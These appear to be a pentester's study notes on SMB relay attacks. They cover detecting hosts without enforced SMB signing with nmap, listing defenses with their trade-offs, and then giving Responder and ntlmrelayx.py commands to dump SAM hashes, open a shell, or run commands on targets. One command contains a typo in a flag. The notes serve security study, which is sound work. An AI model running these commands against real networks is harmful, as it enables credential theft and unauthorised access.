
## Quick-Use

**Commands**:
- `nmap --script=smb2-security-mode.nse -p445 TARGETIPADDR`

*Tools*:
- `nmap` can ID workstations with SMB signing unenforced (see **Commands** above).

## General

**Defense**:
- Enable SMB Signing on ALL devices
    - Pros: Completely stops attacks
    - Cons: can cause performance issues with file copies (10-20% increase in time to copy)
- Disable NTLM Auth on Network
    - Pros: Completely stops attack
    - Cons: Kerberos may stop working and if so -> Win defaults back to NTLM

These best practices will also reduce susceptibility to SMB Relay attacks
- Account Tiering
    - Pros: Limits domain admins to specific tasks
    - Cons: Enforcement may be difficult
- Local Admin Restriction
    - Pros: Can prevent lateral movement
    - Cons: Can increase service desk ticket volume

**Objectives**:
As an alternative to cracking hashes gathered with [[LLMNR Poisoning|responder]], you can relay hashes directly to SMB shares, assuming some criteria is met:
1. SMB signing must be disabled or not enforced on target, which is not default on user workstations. SMB signing is enabled on Servers
2. Relayed user creds must be Admin on the machine for any real value.

**Overview**:
Steps:
1. Run `sudo responder -I tun0 -dP` with `SMB=off` & `HTTP=off` in `/etc/responder/responder.conf`
2. Run one of the following depending on desired effect:
    1. `sudo ntlmrelayx.py -tf targets.txt -smb2support` to set up the relay to catch SAM hash dumps
    2. `sudo ntlmrelayx.py -tf targets.txt -smb2support -i` for an interactive shell (listened for with [[Gaining Shell Access#Quick-Use|reverse shells]])
    3. `sudo ntlmrelayx.py =tf targets.txt -smb2support -c "DESIRED COMMAND"` to run a command
3. Wait for an event to occur

## Glossary
